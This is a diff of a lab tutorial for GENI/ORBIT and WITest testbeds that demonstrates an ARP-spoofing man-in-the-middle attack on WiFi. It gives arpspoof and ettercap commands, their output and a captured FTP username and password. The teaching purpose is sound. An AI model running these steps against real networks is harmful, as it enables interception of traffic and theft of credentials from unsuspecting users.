@@ -1,8 +1,8 @@
 This experiment shows how an attacker can capture traffic on a WiFi hotspot with a simple man-in-the-middle attack. 
 
-It should take about 60-120 minutes to run this experiment, but you will need to have [reserved that time](http://geni.orbit-lab.org) in advance. This experiment uses wireless resources (specifically, parts of the grid testbed on [ORBIT](http://geni.orbit-lab.org)), and you can only use wireless resources on GENI during a reservation.
+It should take about 60-120 minutes to run this experiment, but you will need to have [reserved that time](http://geni.orbit-lab.org) in advance. This experiment uses wireless resources (specifically, the "outdoor" testbed on [ORBIT](http://geni.orbit-lab.org), or the [WITest](https://witestlab.poly.edu) testbed), and you can only use wireless resources on GENI during a reservation.
 
-To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). The project lead of the project you belong to must have [enabled wireless for the project](https://portal.geni.net/secure/wimax-enable.php). Finally, you must have [reserved time on the grid testbed at ORBIT](http://geni.orbit-lab.org), and you must run this experiment during your reserved time.
+To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). The project lead of the project you belong to must have [enabled wireless for the project](https://portal.geni.net/secure/wimax-enable.php). Finally, you must have reserved time on either [the outdoor testbed at ORBIT](http://geni.orbit-lab.org) or the [WITest testbed](https://witestlab.poly.edu), and you must run this experiment during your reserved time.
 
 * Skip to [Results](#results)
 * Skip to [Run my experiment](#runmyexperiment)
@@ -29,254 +29,215 @@ Then, when Alice and Bob communicate, they will unwittingly treat Mallory as the
 
 ## Results
 
-In our experiment, a malicious attacker was able to make two clients on a WiFi network communicate through a malicious attacker, who can then sniff login credentials used by one of the clients.
+In our experiment, a malicious attacker was able to make two hosts on a WiFi network communicate through a malicious attacker, who can then sniff login credentials used by one of the hosts.
 
-After the attacker sent out spoofed ARP messages:
+After the attacker sent out spoofed ARP messages, each host believes that the other host has the _attacker_'s MAC address as its address.
 
-```
-0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
-0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
-0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
-0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
-```
+Here, the host at 192.168.0.3 believes that the host at 192.168.0.4 has 00:0c:42:3a:c4:77 as its physical address:
 
-The clients believe it to be the AP:
-```
-? (192.168.12.164) at 00:15:6d:84:92:d5 [ether] on wlan0
-```
+<pre>
+? (192.168.0.4) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
+</pre>
 
-```
-? (192.168.12.112) at 00:15:6d:84:92:d5 [ether] on wlan0
-```
-
-When one of the clients logs in to the other using FTP, the malicious attacker can capture the login credentials:
+and the host at 192.168.0.4 believes that the host at 192.168.0.3 has 00:0c:42:3a:c4:77 as its physical address:
 
 
+<pre>
+? (192.168.0.3) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
+</pre>
+
+but actually, 00:0c:42:3a:c4:77 is the MAC address belonging to the malicious attacker (at 192.168.0.5):
+
+<pre>
+root@node1-5:~# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr <b>00:0c:42:3a:c4:77</b>  
+          inet addr:192.168.0.5  Bcast:192.168.0.255  Mask:255.255.255.0
+          BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:48 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:384 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:3949 (3.9 KB)  TX bytes:24803 (24.8 KB)
+</pre>
+
+When one of the hosts logs in to the other using FTP, the malicious attacker can capture the login credentials:
+
+
 ```
-FTP : 192.168.12.164:21 -> USER: alice  PASS: password
+FTP : 192.168.0.4:21 -> USER: alice  PASS: SeCrEtPaSsWoRd
 ```
+
+Here's a video of the experiment, including the setup. Note that the title bar for each terminal pane indicates which role it plays, e.g. Mallory (the malicious attacker), Alice (the host whose FTP sessions are compromised), or Bob (the FTP server at which Alice's credentials are compromised):
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/GVu91EISH_M" frameborder="0" allowfullscreen></iframe>
 
 ## Run my experiment
 
-To run this experiment, you must have a current reservation on the "grid" testbed at [ORBIT](https://geni.orbit-lab.org). At your reserved time, open four terminals and SSH to "grid.orbit-lab.org" in each one, with your GENI keys and using your GENI wireless username. (Your GENI wireless username is typically your GENI username, prefixed by "geni-", e.g. mine is "geni-ffund01".)
+To run this experiment, you must have a current reservation on the "outdoor" testbed at [ORBIT](https://geni.orbit-lab.org) or on the [WITest](https://witestlab.poly.edu) testbed. 
 
-The "grid" testbed is a 20x20 grid of nodes with various wireless abilities. Our instructions happen to be written for Atheros wireless cards that use the ath9k driver. (They could apply to some other wireless cards as well, with small modifications.)  To find nodes on the ORBIT grid that have ath9k cards, we log in to [http://geni.orbit-lab.org](http://geni.orbit-lab.org), click on "Control Panel" and then click on "Status Page." We choose the "grid" tab and then check the "Ath9k" box in the "WiFi" panel on the left.
+At your reserved time, open four terminals and SSH to your testbed console (e.g. "witestlab.poly.edu" for WITest, "outdoor.orbit-lab.org" for outdoor on ORBIT) in each one, with your GENI keys and using your GENI wireless username. (Your GENI wireless username is typically your GENI username, prefixed by "geni-", e.g. mine is "geni-ffund01".)
 
-We are interested in groups of four neighboring nodes that are available (shown as a green or blue square) and have an Ath9k card (shown with an X). We can identify at least 11 such groups:
+For this experiment, we will need a group of four neighboring nodes that are available and have an Atheros 9xxx wireless card. In the instructions that follow, we use either node16, node17, node18, and node19 on the WITest testbed; or node1-2, node1-3, node1-4, and node1-5 on the ORBIT outdoor testbed. If any of these are not available, you can substitute other Atheros 9xxx-equipped nodes that are available.
 
-![](/blog/content/images/2016/03/orbit-grid-ath9k.svg)
+### Prepare the testbed
 
-You will choose one of the groups of nodes and use that group for the rest of this experiment.  The groups are:
+Next, load the `wifi-experiment.ndz` disk image onto all the nodes in your group. For example, if you are on WITest and using node16, node17, node18, and node19, run:
 
 ```
-# dark purple group
-node3-18.grid.orbit-lab.org,node7-14.grid.orbit-lab.org,node6-15.grid.orbit-lab.org,node5-16.grid.orbit-lab.org 
+omf-5.4 load -i wifi-experiment.ndz -t omf.witest.node16,omf.witest.node17,omf.witest.node18,omf.witest.node19
+```
+(note that there are no spaces in between the commas and the nodes names in the command above). Alternatively, if you are on outdoor and using node1-2, node1-3, node1-4, and node1-5, run:
 
-# medium blue group
-node5-5.grid.orbit-lab.org,node6-6.grid.orbit-lab.org,node7-7.grid.orbit-lab.org,node8-8.grid.orbit-lab.org 
+```
+omf-5.4 load -i wifi-experiment.ndz -t node1-2.outdoor.orbit-lab.org,node1-3.outdoor.orbit-lab.org,node1-4.outdoor.orbit-lab.org,node1-5.outdoor.orbit-lab.org
+```
 
-# dark gold group
-node7-11.grid.orbit-lab.org,node5-10.grid.orbit-lab.org,node4-11.grid.orbit-lab.org,node10-11.grid.orbit-lab.org 
+When the image has been loaded onto the nodes, turn them on. For example, if using those four nodes on WITest, run 
 
-# dark green group
-node17-10.grid.orbit-lab.org,node18-8.grid.orbit-lab.org,node14-11.grid.orbit-lab.org,node14-10.grid.orbit-lab.org 
+```
+omf tell -a on -t omf.witest.node16,omf.witest.node17,omf.witest.node18,omf.witest.node19
+```
 
-# dark red group
-node10-1.grid.orbit-lab.org,node11-4.grid.orbit-lab.org,node10-4.grid.orbit-lab.org,node8-3.grid.orbit-lab.org 
+whereas if using the four nodes on outdoor, you would run
 
-# grey group
-node11-17.grid.orbit-lab.org,node10-17.grid.orbit-lab.org,node11-20.grid.orbit-lab.org,node10-20.grid.orbit-lab.org 
-
-# light blue group
-node19-3.grid.orbit-lab.org,node19-4.grid.orbit-lab.org,node20-4.grid.orbit-lab.org,node20-5.grid.orbit-lab.org 
-
-# light pink group
-node14-7.grid.orbit-lab.org,node13-8.grid.orbit-lab.org,node11-7.grid.orbit-lab.org,node10-7.grid.orbit-lab.org 
-
-# light green group
-node1-10.grid.orbit-lab.org,node1-11.grid.orbit-lab.org,node1-12.grid.orbit-lab.org,node3-13.grid.orbit-lab.org 
-
-# light orange group
-node20-10.grid.orbit-lab.org,node20-8.grid.orbit-lab.org,node20-12.grid.orbit-lab.org,node20-7.grid.orbit-lab.org 
-
-# light purple group
-node20-16.grid.orbit-lab.org,node20-17.grid.orbit-lab.org,node20-18.grid.orbit-lab.org,node20-19.grid.orbit-lab.org 
+```
+omf tell -a on -t node1-2.outdoor.orbit-lab.org,node1-3.outdoor.orbit-lab.org,node1-4.outdoor.orbit-lab.org,node1-5.outdoor.orbit-lab.org
 ```
 
 
-For convenience, set a shell variable called "GROUP" that contains the list of nodes in your group. For example, if you are using the light purple group, run
+Wait a few minutes for your nodes to boot. Then, open _six_ terminal windows and SSH to your testbed console ("witestlab.poly.edu" or "outdoor.orbit-lab.org") in each one.
 
-```
-GROUP=node20-16.grid.orbit-lab.org,node20-17.grid.orbit-lab.org,node20-18.grid.orbit-lab.org,node20-19.grid.orbit-lab.org 
-```
+Of the four nodes in your group, designate one node as the access point (AP), one node as Alice, one node as Bob, and one node as Mallory. In this experiment, Mallory will attempt to silently intercept communications between Alice and Bob, capturing sensitive information such as FTP login credentials.
 
-in a shell, and make sure to use that shell for the next few commands so that we can refer to "$GROUP" in our commands. Note that there should be no spaces anywhere in the list above.
+* In one of your SSH terminals, SSH to the node that you have designated as the AP, as the "root" user.
+* In one of your SSH terminals, SSH to the node that you have designated as Bob, as the "root" user.
+* In one of your SSH terminals, SSH to the node that you have designated as Alice, as the "root" user.
+* In the other three of your SSH terminals, SSH to the node that you have designated as Mallory, as the "root" user.
 
+### Configure Bob as an FTP server
 
-Next, load the baseline disk image onto all the nodes in your group using
+Bob is going to provide an FTP server. Alice will log in to this FTP server, so she will need an account. 
 
-```
-if [[ -n "$GROUP" ]]
-then 
-  omf load -i baseline.ndz -t "$GROUP"
-else 
-  echo "Please set the GROUP variable"
-fi
-```
-
-
-When the image has been loaded onto the nodes, turn them on with
-
-```
-if [[ -n "$GROUP" ]]
-then 
-  omf tell -a on -t "$GROUP"
-else 
-  echo "Please set the GROUP variable"
-fi
-```
-
-Finally, use your four terminals to log in to each of the four nodes in your group as "root" user, e.g.
-
-```
-ssh root@node1-10
-```
-
-etc.
-
-You now have terminals open to four nodes. Designate one node as the AP node, one node as Alice, one node as Bob, and one node as Mallory. In this experiment, Mallory will attempt to silently intercept communications between Alice and Bob, capturing sensitive information such as FTP login credentials.
-
-Bob is going to provide an FTP server. On the node designated as Bob, run
-
-```
-apt-get update
-apt-get -y install vsftpd
-```
-
-Then create an account for Alice so she can log in to Bob's FTP server. On Bob, run
+Create an account for Alice so she can log in to Bob's FTP server. On Bob, run
 
 ```
 useradd -m alice -s /bin/sh
 passwd alice
 ```
 
-and enter a password for "alice" when prompted.
+and enter a password for "alice" when prompted. (No characters will appear as you type.)
 
-Mallory will need some software to carry out her attack. On the Mallory node, run
+### Start the AP
 
-```
-apt-get update
-apt-get -y install dsniff ettercap-text-only
-```
-
-Mallory also needs to enable packet forwarding, so that Alice and Bob's traffic will be forwarded to each other through her and they won't notice any disruption. On Mallory, run
+On the node designated as the access point, start the wireless network with
 
 ```
-sysctl -w net.ipv4.ip_forward=1
-```
-
-The AP node will also need some software. On the AP, run
-
-```
-apt-get update
-apt-get -y install git dnsmasq hostapd
-```
-
-Then, to set up and start the AP, run
-
-```
-modprobe ath9k
 ifconfig wlan0 up
-
-git clone https://github.com/oblique/create_ap.git
-cd create_ap
-make
+create_ap -n wlan0 mitm SECRETPASSWORD
 ```
 
-and finally,
+where "SECRETPASSWORD" is the passphrase. This will create an AP with ESSID "mitm" (for "Man-in-the-Middle").
 
-```
-essid=$(hostname -s)
-./create_ap -n wlan0 "$essid" SECRETPASSWORD
-```
-
-where "SECRETPASSWORD" is the passphrase. This will create an AP with ESSID equal to the short hostname of the AP node, e.g. "node3-18".
-
-The command above may fail if the node has two wireless interfaces, and the one that is named wlan0 does not support AP mode. In that case, just try
-
-```
-ifconfig wlan1 up
-
-essid=$(hostname -s)
-./create_ap -n wlan1 "$essid" SECRETPASSWORD
-```
-
-
+### Connect to the access point
 
 Now that the AP is up, Alice, Bob, and Mallory are ready to connect to it. On *each* of those three nodes, run
 
 ```
-apt-get update
-apt-get -y --force-yes install isc-dhcp-client
-modprobe ath9k
 ifconfig wlan0 up
 ```
 
-Run
+to bring up the wireless interface. Then, run
 
 ```
 iwlist wlan0 scan
 ```
 
-and make sure you can see the network with ESSID equal to the short hostname of your AP node.
+and make sure you can see the network with "mitm" ESSID.
 
-Then run
+Then, create a WiFi config file with
 
 ```
-wpa_passphrase ESSID SECRETPASSWORD > wpa.conf
+wpa_passphrase mitm SECRETPASSWORD > wpa.conf
 ```
 
-where again, "ESSID" is the ESSID of your network and "SECRETPASSWORD" is its passphrase.
+where "SECRETPASSWORD" is its passphrase.
 
-Finally, connect to the network with
+Connect to the network with
 
 ```
 wpa_supplicant -iwlan0 -cwpa.conf -B
 ```
 
-and then run 
+Use 
 
 ```
-dhclient wlan0
+iwconfig wlan0
 ```
 
-to get an IP address. On each of the three nodes, run
+to verify that you are connected.
+
+Finally, set an IP address on each node. On Alice:
+
+```
+ifconfig wlan0 192.168.0.3
+```
+
+On Bob:
+
+```
+ifconfig wlan0 192.168.0.4
+```
+
+and on Mallory: 
+
+```
+ifconfig wlan0 192.168.0.5
+```
+
+Also use
 
 ```
 ifconfig wlan0
 ```
 
-and make a note of the node's MAC address and IP address. 
+and make a note of each node's MAC address.
 
-Make sure all the nodes can ping one another by IP address.
+Finally, make sure all the nodes can ping one another by IP address. On each, run:
+
+```
+ping -c 1 192.168.0.3
+ping -c 1 192.168.0.4
+ping -c 1 192.168.0.5
+```
+
+
+
+### Carry out the attack
 
 Now that everyone is on the network, Mallory is ready to carry out her attack. For this attack, she will send gratuitous ARP messages, making Alice think that Mallory's MAC address is the Layer 2 address for Bob's IP address, and making Bob think that Mallory's MAC address is the Layer 2 address for Alice's IP address.
 
 To start the ARP spoofing, Mallory will run
 
-```
-arpspoof -i wlan0 -t 192.168.12.112 192.168.12.164 &
-arpspoof -i wlan0 -t 192.168.12.164 192.168.12.112 &
-```
+<pre>
+arpspoof -i wlan0 -t 192.168.0.3 192.168.0.4
+</pre>
 
-substituting the WiFi IP addresses of Alice and Bob in the commands above. You should see output on the terminal indicating the Mallory is sending gratuitous ARPs. For example, in my case:
+in one terminal and 
 
-```
-0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
-0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
-0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
-0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
-```
+<pre>
+arpspoof -i wlan0 -t 192.168.0.4 192.168.0.3 
+</pre>
+
+in another.
+
+Here, Mallory sends ARP messages to Alice (192.168.0.3) that make Alice believe that Bob (192.168.0.4) is located at Mallory's MAC access. Mallory also sends ARP messages to Bob to that make Bob believe that Alice is located at Mallory's MAC address.
+
+You should see output on the terminal indicating the Mallory is sending gratuitous ARPs. For example:
+
+<pre>
+0:c:42:3a:c4:77 0:c:42:3a:b4:8 0806 42: <b>arp reply 192.168.0.3 is-at 0:c:42:3a:c4:77</b>
+</pre>
+
+These ARP replies will continue to appear at regular intervals.
 
 Also, if Alice runs
 
@@ -284,11 +245,11 @@ Also, if Alice runs
 arp -a
 ```
 
-we can see that Alice believes that Bob is at Mallory's MAC address:
+we can see that Alice believes that Bob is at Mallory's MAC address, e.g.:
 
-```
-? (192.168.12.164) at 00:15:6d:84:92:d5 [ether] on wlan0
-```
+<pre>
+? (192.168.0.4) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
+</pre>
 
 and if we run
 
@@ -296,19 +257,29 @@ and if we run
 arp -a
 ```
 
-on Bob, we'll see that he believes Alice is at Mallory's MAC address:
+on Bob, we'll see that he believes _Alice_ is at Mallory's MAC address, e.g.:
+
+<pre>
+? (192.168.0.3) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
+</pre>
+
+Since the ARP poisoning has been successful, Mallory will now receive traffic destined for  Alice and Bob, and can look at it or modify it before passing it on to its intended destination. 
+
+Mallory also needs to enable packet forwarding, so that Alice and Bob's traffic will be forwarded to each other through her and they won't notice any disruption. In the third Mallory terminal, run
 
 ```
-? (192.168.12.112) at 00:15:6d:84:92:d5 [ether] on wlan0
+sysctl -w net.ipv4.ip_forward=1
 ```
 
-Since the ARP poisoning has been successful, Mallory can now intercept traffic between Alice and Bob. Open a new (fifth) terminal, SSH into the grid, and SSH into Mallory. Run
+to enable packet forwarding. 
+
+Then, start the [Ettercap](https://ettercap.github.io/ettercap/) packet interceptor/sniffer:
 
 ```
 ettercap -T -i wlan0
 ```
 
-Now Mallory will see any interesting traffic passing between Alice and Bob.
+Any interesting traffic passing between Alice and Bob (passing through Mallory) will appear in the Ettercap output. 
 
 Alice is ready to start an FTP session, in which she connects to Bob. On Alice, run
 
@@ -320,30 +291,51 @@ ftp
 and then at the FTP prompt, open a connection to Bob with
 
 ```
-open 192.168.12.164
+open 192.168.0.4
 ```
 
-substituting Bob's IP address in the command above.
+to connect to Bob.
 
 When prompted, give your name ("alice") and the password you set when you previously ran "passwd alice" on Bob.
 
 Alice should see a successful connection to Bob, and has no idea that the connection was intercepted by Mallory. In fact, if you check the "ettercap" window on Mallory, you should see a line like
 
 ```
-FTP : 192.168.12.164:21 -> USER: alice  PASS: password
+FTP : 192.168.0.4:21 -> USER: alice  PASS: SeCrEtPaSsWoRd
 ```
 
 in the output, i.e. Mallory has found out Alice's username and password for logging in to Bob.
 
 Mallory can then open an FTP or SSH connection to Bob using Alice's credentials.
 
-Besides for capturing Alice's credentials, Mallory can snoop on any sensitive data that goes over the connection between Alice and Bob. For example, if Alice runs
-
-```
-ls /
-```
-
-in the FTP session, to list the contents of the root filesystem on Bob, we should see the directory listing in Mallory's terminal.
-
-
 ## Notes
+
+You can also run this experiment on any group of four nodes on the "grid" testbed on ORBIT. The "grid" testbed is generally in high demand, however.
+
+To use another wireless testbed besides for ORBIT or WITest, you may need to install some software or do some other configuration steps that are already prepared on the `wifi-experiment.ndz` disk image on ORBIT/WITest.
+
+To create the `wifi-experiment.ndz` disk image, I started from a baseline Ubuntu 14.04 disk image. Then I installed some software from the Ubuntu package repositories: 
+
+
+```
+apt-get update
+apt-get -y install git hostapd iproute2 dnsmasq iptables haveged aircrack-ng dsniff ettercap-text-only vsftpd
+```
+I installed the [create\_ap](https://github.com/oblique/create_ap.git) tool, which makes it easy to set up a device as a WiFi access point:
+
+```
+git clone https://github.com/oblique/create_ap.git
+cd create_ap
+make install
+```
+I also un-blacklisted the `ath9k` driver, i.e.
+
+```
+rm /etc/modprobe.d/blacklist-ath9k.conf
+```
+
+so that the `ath9k` module is loaded at boot. Alternatively, you can manually load the module on each boot with
+
+```
+modprobe ath9k
+```
